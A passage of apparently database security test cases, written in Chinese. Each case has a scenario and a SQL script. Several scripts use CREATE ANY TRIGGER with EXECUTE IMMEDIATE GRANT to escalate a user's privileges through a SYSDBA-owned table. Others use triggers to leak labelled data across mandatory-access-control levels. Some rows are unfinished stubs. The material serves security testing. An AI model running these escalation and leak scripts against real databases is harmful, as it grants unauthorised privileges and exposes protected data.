INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--user1用户
--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
BEFORE UPDATE ON SYSDBA.T1
FOR EACH ROW
DECLARE 
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT INSERT, SELECT ON SYSDBA.T1 TO USER1';
END;

--更新数据，以触发触发器
UPDATE SYSDBA.T1 SET NAME = 'USER1';

--查询授权结果
SELECT * FROM USER_TAB_PRIVS;
"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，以及sysdba用户表上的插入权限，通过给SYSDBA用户的该表创建触发器，调用存储过程授权，user1用户插入数据触发触发器，执行授权操作。,"--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;
--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1
--创建表
CREATE TABLE T2(ID INT, NAME VARCHAR(20));

--创建存储过程
CREATE OR REPLACE PROCEDURE INSERT_MY_TABLE
AUTHID CURRENT_USER
AS
BEGIN 
 INSERT INTO USER1.T2 SELECT * FROM SYSDBA.T1;
END;

--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
AFTER INSERT ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 USER1.INSERT_MY_TABLE();
END;

--插入数据，以触发触发器
INSERT INTO SYSDBA.T1 VALUES(2, 'USER1');

--USER1用户
--查询授权结果
SELECT * FROM T2;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，以及sysdba用户表上的更新权限，通过给SYSDBA用户的该表创建触发器，调用存储过程授权，user1用户更新数据触发触发器，执行授权操作。,"--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;
--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');
--授权更新权限
GRANT UPDATE ON SYSDBA.T1 TO USER1;

--USER1
--创建存储过程
CREATE OR REPLACE PROCEDURE GRANT_ANY
AUTHID CURRENT_USER
AS
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT SELECT ANY TABLE TO USER1';
END;

--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
AFTER UPDATE ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 USER1.GRANT_ANY();
END;

--更新数据，以触发触发器
UPDATE SYSDBA.T1 SET NAME = 'USER1';

--USER1用户
--查询授权结果
SELECT * FROM USER_SYS_PRIVS;"
创建一组测试用例，使用create any trigger权限实现间接提权,user1用户拥有create any trigger权限，以及sysdba用户表上的删除权限，通过给SYSDBA用户的该表创建触发器，调用存储过程授权，user1用户删除数据触发触发器，执行授权操作。,"--SYSDBA用户
--创建表
CREATE TABLE T1(ID INT, NAME VARCHAR(20));
--授予CREATE ANY TRIGGER权限
GRANT CREATE ANY TRIGGER TO USER1;
--插入数据
INSERT INTO SYSDBA.T1 VALUES(1, 'SYSDBA');

--USER1
--创建存储过程
CREATE OR REPLACE PROCEDURE GRANT_SCHEMA
AUTHID CURRENT_USER
AS
 PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN 
 EXECUTE IMMEDIATE 'GRANT CREATE ANY SCHEMA TO USER1';
END;

--创建触发器
CREATE OR REPLACE TRIGGER TRI_GRANT
BEFORE DELETE ON SYSDBA.T1
FOR EACH ROW
BEGIN 
 USER1.GRANT_SCHEMA();
END;

--删除表，以触发触发器
DELETE FROM SYSDBA.T1;

--USER1用户
--查询授权结果
SELECT * FROM USER_SYS_PRIVS;"
错误信息泄漏,,
角色？？,,
instand of 视图  ------都还没有做,,
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol1用户通过创建触发器，在插入数据时插入到另一张表上，u_pol2用户插入数据时，触发触发器插入数据，从而发现触发器的存在，并读取到高等级设定的数据,"‘--U_POL1用户
CONNECT U_POL1/1234564789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--施加策略
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB2', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/1234564789;
--创建触发器
CREATE OR REPLACE TRIGGER TRG_INSERT
BEFORE INSERT ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO TAB2(ID, NAME) VALUES(1,1);
END;

--分别授权插入、查询权限
GRANT INSERT ON TAB1 TO U_POL2;
GRANT SELECT ON TAB2 TO U_POL2;

--U_POL2用户
CONNECT U_POL2/1234564789;
--插入数据，以触发触发器
INSERT INTO U_POL1.TAB1(ID, NAME) VALUES(1,'USER2);

--查询结果
SELECT * FROM U_POL1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol1用户通过创建触发器，在更新数据时将原数据插回该表，u_pol2用户更新数据时，触发触发器插入数据，从而发现触发器的存在,"‘--U_POL1用户
CONNECT U_POL1/1234564789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
--授权查询、更新权限
GRANT INSERT, SELECT, UPDATE ON TAB1 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--施加策略到TAB1表
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/1234564789;
--创建触发器
CREATE OR REPLACE TRIGGER TRG_UPDATE
BEFORE UPDATE ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO TAB1(ID, NAME) VALUES(NEW.ID, OLD.NAME);
END;

--U_POL2用户
CONNECT U_POL2/1234564789;
--插入数据
INSERT INTO U_POL1.TAB1(ID, NAME) VALUES(1,'USER2'),(2,'USER2');

--更新数据，以触发触发器
UPDATE U_POL1.TAB1 SET NAME = 'USER22';

--查询结果
SELECT * FROM U_POL1.TAB1;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol1用户通过创建触发器，在删除数据时将原数据插回该表，u_pol2用户删除数据时，触发触发器插入数据，从而发现触发器的存在,"‘--U_POL1用户
CONNECT U_POL1/1234564789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
--授权查询、更新权限
GRANT INSERT, SELECT, DELETE ON TAB1 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--施加策略到TAB1表
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/1234564789;
--创建触发器
CREATE OR REPLACE TRIGGER TRG_DELETE
BEFORE DELETE ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO TAB1(ID, NAME) VALUES(OLD.ID, OLD.NAME);
END;

--U_POL2用户
CONNECT U_POL2/1234564789;
--插入数据
INSERT INTO U_POL1.TAB1(ID, NAME) VALUES(1,'USER2'),(2,'USER2');

--删除数据，以触发触发器
DELETE FROM U_POL1.TAB1 WHERE ID = 1;

--查询结果
SELECT * FROM U_POL1.TAB1;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol1用户下存在一张具有安全策略的高等级表、一张普通表，创建一个触发器，在插入数据到策略表时将数据插入到普通表中。当u_pol1用户执行插入语句，就会触发触发器将数据插入普通表中，那么u_pol2用户可以读取到这些数据,"‘--U_POL1用户
CONNECT U_POL1/1234564789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));

--授权查询权限
GRANT SELECT ON TAB2 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--施加策略到TAB1表
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/1234564789;
--创建触发器
CREATE OR REPLACE TRIGGER INSERT_TAB1_TO_TAB2
AFTER INSERT ON TAB1 
FOR EACH ROW 
BEGIN 
 INSERT INTO TAB2 SELECT ID, NAME FROM TAB1;
END;

--插入数据，以触发触发器
INSERT INTO U_POL1.TAB1(ID, NAME) VALUES(1,'USER1');

--U_POL2用户
CONNECT U_POL2/1234564789;
--查询结果
SELECT * FROM U_POL1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol1用户下存在一张具有安全策略的高等级表、一张普通表，创建一个触发器，在更新策略表的数据时将数据插入到普通表中。当u_pol1用户执行更新语句，就会触发触发器将数据插入普通表中，那么u_pol2用户可以读取到这些数据,"‘--U_POL1用户
CONNECT U_POL1/1234564789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20), NEW_NAME VARCHAR(20));

--插入数据
INSERT INTO U_POL1.TAB1(ID, NAME) VALUES(1,'USER1');

--授权查询权限
GRANT SELECT ON TAB2 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--施加策略到TAB1表
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/1234564789;
--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_TAB1_TO_TAB2
BEFORE UPDATE ON TAB1 
FOR EACH ROW 
BEGIN 
 INSERT INTO TAB2 VALUES(NEW.ID, OLD.NAME, NEW.NAME);
END;

--更新数据，以触发触发器
UPDATE U_POL1.TAB1 SET NAME = 'U_POL1';

--U_POL2用户
CONNECT U_POL2/1234564789;
--查询结果
SELECT * FROM U_POL1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol1用户下存在一张具有安全策略的高等级表、一张普通表，创建一个触发器，在删除策略表的数据时将数据插入到普通表中。当u_pol1用户执行删除语句，就会触发触发器将数据插入普通表中，那么u_pol2用户可以读取到这些数据,"‘--U_POL1用户
CONNECT U_POL1/1234564789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));

--插入数据
INSERT INTO U_POL1.TAB1(ID, NAME) VALUES(1,'USER1');

--授权查询权限
GRANT SELECT ON TAB2 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--施加策略到TAB1表
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/1234564789;
--创建触发器
CREATE OR REPLACE TRIGGER DELETE_TAB1_TO_TAB2
BEFORE DELETE ON TAB1 
FOR EACH ROW 
BEGIN 
 INSERT INTO TAB2 VALUES(OLD.ID, OLD.NAME);
END;

--更新数据，以触发触发器
DELETE FROM TAB1 WHERE ID = 1;

--U_POL2用户
CONNECT U_POL2/1234564789;
--查询结果
SELECT * FROM U_POL1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，user1用户是普通用户，u_pol1用户下拥有user1用户的表的插入权，创建一个触发器，在插入数据时将数据插入到user1用户的表中。当u_pol1用户执行插入语句，就会触发触发器将数据插入普通表中，那么u_pol2用户可以读取到这些数据,"‘--U_POL1用户
CONNECT U_POL1/123456789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
GRANT INSERT, SELECT, UPDATE ON TAB2 TO U_POL2;

--USER1用户
CONNECT USER1/123456789;
--创建表
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));
--分别授权插入、查询权限
GRANT INSERT, SELECT ON TAB2 TO U_POL1;
GRANT INSERT, SELECT ON TAB2 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--授权策略
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--U_POL1用户
CONNECT U_POL1/123456789;
--创建触发器
CREATE OR REPLACE TRIGGER INSERT_USER1
BEFORE INSERT ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO USER1.TAB2 VALUES(NEW.ID, NEW.NAME);
END;
--插入数据，以触发触发器
INSERT INTO TAB1(ID,NAME) VALUES(1,'U_POL1');

--U_POL2用户
CONNECT U_POL2/123456789;
--U_POL1用户操作前后执行两次查询，对比结果
SELECT * FROM USER1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，user1用户是普通用户，u_pol1用户下拥有user1用户的表的插入权，创建一个触发器，在更新数据时将更新前后的数据插入到user1用户的表中。当u_pol1用户执行更新语句，就会触发触发器将数据插入普通表中，那么u_pol2用户可以读取到这些数据,"‘--U_POL1用户
CONNECT U_POL1/123456789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
GRANT INSERT, SELECT, UPDATE ON TAB2 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--授权策略
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--USER1用户
CONNECT USER1/123456789;
--创建表
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));
--分别授权插入、查询权限
GRANT INSERT, SELECT ON TAB2 TO U_POL1;
GRANT INSERT, SELECT ON TAB2 TO U_POL2;

--U_POL1用户
CONNECT U_POL1/123456789;
--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_USER1
AFTER UPDATE ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO USER1.TAB2 VALUES(OLD.ID, OLD.NAME);
 INSERT INTO USER1.TAB2 VALUES(NEW.ID, NEW.NAME);
END;
--插入数据
INSERT INTO TAB1(ID,NAME) VALUES(1,'U_POL1'),(2,'U_POL1');
--更新数据，以触发触发器
UPDATE TAB1 SET ID = 1 WHERE NAME = 'U_POL1';

--U_POL2用户
CONNECT U_POL2/123456789;
--U_POL1用户操作前后执行两次查询，对比结果
SELECT * FROM USER1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，user1用户是普通用户，u_pol1用户下拥有user1用户的表的插入权，创建一个触发器，在删除数据时将被删除的数据插入到user1用户的表中。当u_pol1用户执行删除语句，就会触发触发器将数据插入普通表中，那么u_pol2用户可以读取到这些数据,"--U_POL1用户
CONNECT U_POL1/123456789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));
GRANT INSERT, SELECT, DELETE ON TAB2 TO U_POL2;

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--授权策略
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);

--USER1用户
CONNECT USER1/123456789;
--创建表
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));
--分别授权插入、查询权限
GRANT INSERT, SELECT ON TAB2 TO U_POL1;
GRANT INSERT, SELECT ON TAB2 TO U_POL2;

--U_POL1用户
CONNECT U_POL1/123456789;
--创建触发器
CREATE OR REPLACE TRIGGER DELETE_USER1
AFTER DELETE ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO USER1.TAB2 VALUES(OLD.ID, OLD.NAME);
END;
--插入数据
INSERT INTO TAB1(ID,NAME) VALUES(1,'U_POL1'),(2,'U_POL1');
--更新数据，以触发触发器
DELETE FROM TAB1 WHERE ID = 2;

--U_POL2用户
CONNECT U_POL2/123456789;
--U_POL1用户操作前后执行两次查询，对比结果
SELECT * FROM USER1.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol3用户是另一个策略下的用户，u_pol1用户下拥有u_pol3用户的表的插入权，创建一个触发器，在插入数据时将数据插入到u_pol3用户的表中。当u_pol1用户执行插入语句，就会触发触发器将数据插入u_pol3用户的表中，那么u_pol2用户可以读取到这些数据,"--U_POL1用户
CONNECT U_POL1/123456789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--创建策略2、3
MAC_CREATE_POLICY('POL2');
MAC_CREATE_POLICY('POL3');
--为策略2创建等级
MAC_CREATE_LEVEL('POL2', 13, 'L_03');
MAC_CREATE_LEVEL('POL2', 14, 'L_04');
--为策略3创建等级
MAC_CREATE_LEVEL('POL3', 11, 'L_01');
MAC_CREATE_LEVEL('POL3', 12, 'L_02');

--授予U_POL1、U_POL2用户策略2
MAC_USER_SET_LEVELS('POL2', 'U_POL1', 'L_04', 'L_04', 'L_04', 'L_04');
MAC_USER_SET_LEVELS('POL2', 'U_POL2', 'L_03', 'L_03', 'L_03', 'L_03');
--授予U_POL3用户策略3
MAC_USER_SET_LEVELS('POL3', 'U_POL3', 'L_02', 'L_02', 'L_02', 'L_02');

--授予U_POL1用户表策略2
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);
--授予U_POL3用户表策略3
MAC_APPLY_TABLE_POLICY ('POL3', 'U_POL3', 'TAB2', 'LABEL_COL', 'L_02::',0);

--U_POL3用户
CONNECT U_POL3/123456789;
--创建表
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));
--分别授权插入、查询权限
GRANT INSERT, SELECT ON TAB2 TO U_POL1;
GRANT INSERT, SELECT ON TAB2 TO U_POL2;

--U_POL1用户
CONNECT U_POL1/123456789;
--创建触发器
CREATE OR REPLACE TRIGGER INSERT_U_POL3
BEFORE INSERT ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO U_POL3.TAB2(ID, NAME) VALUES(NEW.ID, NEW.NAME);
END;
--插入数据，以触发触发器
INSERT INTO U_POL1.TAB1(ID,NAME) VALUES(2,'U_POL1');

--U_POL2用户
CONNECT U_POL2/123456789;
--U_POL1用户操作前后执行两次查询，对比结果
SELECT * FROM U_POL3.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol3用户是另一个策略下的用户，u_pol1用户下拥有u_pol3用户的表的插入权，创建一个触发器，在更新数据时将更新前后数据插入到u_pol3用户的表中。当u_pol1用户执行更新语句，就会触发触发器将数据插入u_pol3用户的表中，那么u_pol2用户可以读取到这些数据,"--U_POL1用户
CONNECT U_POL1/123456789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--创建策略2、3
MAC_CREATE_POLICY('POL2');
MAC_CREATE_POLICY('POL3');
--为策略2创建等级
MAC_CREATE_LEVEL('POL2', 13, 'L_03');
MAC_CREATE_LEVEL('POL2', 14, 'L_04');
--为策略3创建等级
MAC_CREATE_LEVEL('POL3', 11, 'L_01');
MAC_CREATE_LEVEL('POL3', 12, 'L_02');

--授予U_POL1、U_POL2用户策略2
MAC_USER_SET_LEVELS('POL2', 'U_POL1', 'L_04', 'L_04', 'L_04', 'L_04');
MAC_USER_SET_LEVELS('POL2', 'U_POL2', 'L_03', 'L_03', 'L_03', 'L_03');
--授予U_POL3用户策略3
MAC_USER_SET_LEVELS('POL3', 'U_POL3', 'L_02', 'L_02', 'L_02', 'L_02');

--授予U_POL1用户表策略2
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);
--授予U_POL11用户表策略3
MAC_APPLY_TABLE_POLICY ('POL3', 'U_POL3', 'TAB2', 'LABEL_COL', 'L_02::',0);

--U_POL3用户
CONNECT U_POL3/123456789;
--创建表
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));
--分别授权插入、查询权限
GRANT INSERT, SELECT ON TAB2 TO U_POL1;
GRANT INSERT, SELECT ON TAB2 TO U_POL2;

--U_POL1用户
CONNECT U_POL1/123456789;
--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_U_POL3
AFTER UPDATE ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO U_POL3.TAB2(ID, NAME) VALUES(OLD.ID, OLD.NAME);
 INSERT INTO U_POL3.TAB2(ID, NAME) VALUES(NEW.ID, NEW.NAME);
END;
--插入数据
INSERT INTO U_POL1.TAB1(ID,NAME) VALUES(2,'U_POL1');
--更新数据，以触发触发器
UPDATE U_POL1.TAB1 SET ID = 1 WHERE NAME = 'U_POL1';

--U_POL2用户
CONNECT U_POL2/123456789;
--U_POL1用户操作前后执行两次查询，对比结果
SELECT * FROM U_POL3.TAB2;"
创建一组测试用例，能够展示强制访问控制下使用触发器可能会引发的安全问题,u_pol1用户是高等级用户，u_pol2用户是低等级用户，SYSSSO用户是安全管理员，u_pol3用户是另一个策略下的用户，u_pol1用户下拥有u_pol3用户的表的插入权，创建一个触发器，在删除数据时将删除的数据插入到u_pol3用户的表中。当u_pol1用户执行删除语句，就会触发触发器将数据插入u_pol3用户的表中，那么u_pol2用户可以读取到这些数据,"‘--U_POL1用户
CONNECT U_POL1/123456789;
--创建表1
CREATE TABLE TAB1(ID INT, NAME VARCHAR(20));

--SYSSSO用户
CONNECT SYSSSO/SYSSSO;
--创建策略2、3
MAC_CREATE_POLICY('POL2');
MAC_CREATE_POLICY('POL3');
--为策略2创建等级
MAC_CREATE_LEVEL('POL2', 13, 'L_03');
MAC_CREATE_LEVEL('POL2', 14, 'L_04');
--为策略3创建等级
MAC_CREATE_LEVEL('POL3', 11, 'L_01');
MAC_CREATE_LEVEL('POL3', 12, 'L_02');

--授予U_POL1、U_POL2用户策略2
MAC_USER_SET_LEVELS('POL2', 'U_POL1', 'L_04', 'L_04', 'L_04', 'L_04');
MAC_USER_SET_LEVELS('POL2', 'U_POL2', 'L_03', 'L_03', 'L_03', 'L_03');
--授予U_POL3用户策略3
MAC_USER_SET_LEVELS('POL3', 'U_POL3', 'L_02', 'L_02', 'L_02', 'L_02');

--授予U_POL1用户表策略2
MAC_APPLY_TABLE_POLICY ('POL2', 'U_POL1', 'TAB1', 'LABEL_COL', 'L_04::',0);
--授予U_POL3用户表策略3
MAC_APPLY_TABLE_POLICY ('POL3', 'U_POL3', 'TAB2', 'LABEL_COL', 'L_02::',0);

--U_POL3用户
CONNECT U_POL3/123456789;
--创建表
CREATE TABLE TAB2(ID INT, NAME VARCHAR(20));
--分别授权插入、查询权限
GRANT INSERT, SELECT ON TAB2 TO U_POL1;
GRANT INSERT, SELECT ON TAB2 TO U_POL2;

--U_POL1用户
CONNECT U_POL1/123456789;
--创建触发器
CREATE OR REPLACE TRIGGER DELETE_U_POL3
AFTER DELETE ON TAB1
FOR EACH ROW 
BEGIN 
 INSERT INTO U_POL3.TAB2(ID, NAME) VALUES(OLD.ID, OLD.NAME);
END;
--插入数据
INSERT INTO U_POL1.TAB1(ID,NAME) VALUES(1,'U_POL1'), (2,'U_POL1');
--删除数据，以触发触发器
DELETE FROM U_POL1.TAB1 WHERE NAME = 'U_POL1';

--U_POL2用户
CONNECT U_POL2/123456789;
--U_POL1用户操作前后执行两次查询，对比结果
SELECT * FROM U_POL3.TAB2;"
创建一组测试用例，能够展示触发器的存在影响系统表的查询结果,user1用户拥有创建触发器的权限，创建插入型触发器，并授予user2用户查询该表的权限。那么user2用户通过查询系统表all_triggers就可以查看到该触发器,"‘--USER1用户
CONNECT USER1/123456789;

--创建表
CREATE TABLE T1 (ID INT, NAME VARCHAR(20));
CREATE TABLE T2 (ID INT, NAME VARCHAR(20));

--创建触发器
CREATE OR REPLACE TRIGGER INSERT_T1
BEFORE INSERT ON T1
FOR EACH ROW 
BEGIN 
 INSERT INTO T2 VALUES(NEW.ID, NEW.NAME);
END;

--授予SELECT权限
GRANT SELECT ON T1 TO USER2;

--USER2用户
CONNECT USER2/123456789;
--查询系统视图
SELECT  * FROM ALL_TRIGGERS;"
创建一组测试用例，能够展示触发器的存在影响系统表的查询结果,user1用户拥有创建触发器的权限，创建更新型触发器，并授予user2用户查询该表的权限。那么user2用户通过查询系统表all_triggers就可以查看到该触发器,"‘--USER1用户
CONNECT USER1/123456789;
--创建表
CREATE TABLE T1 (ID INT, NAME VARCHAR(20));

--创建触发器
CREATE OR REPLACE TRIGGER UPDATE_T1
BEFORE UPDATE ON T1
FOR EACH ROW 
BEGIN 
 INSERT INTO T1 VALUES(NEW.ID, NEW.NAME);
END;

--授予SELECT权限
GRANT SELECT ON T1 TO USER2;

--USER2用户
CONNECT USER2/123456789;
--查询系统视图
SELECT  * FROM ALL_TRIGGERS;"
创建一组测试用例，能够展示触发器的存在影响系统表的查询结果,user1用户拥有创建触发器的权限，创建删除型触发器，并授予user2用户查询该表的权限。那么user2用户通过查询系统表all_triggers就可以查看到该触发器,"‘--USER1用户
CONNECT USER1/123456789;
--创建表
CREATE TABLE T1 (ID INT, NAME VARCHAR(20));

--插入数据
INSERT  INTO T1 VALUES(1, 'USER1');
--创建触发器
CREATE OR REPLACE TRIGGER DELETE_T1
BEFORE DELETE ON T1
FOR EACH ROW 
BEGIN 
 INSERT INTO T1 VALUES(OLD.ID, OLD.NAME);
END;

--授予SELECT权限
GRANT SELECT ON T1 TO USER2;

--USER2用户
CONNECT USER2/123456789;
--查询系统视图
SELECT  * FROM ALL_TRIGGERS;"
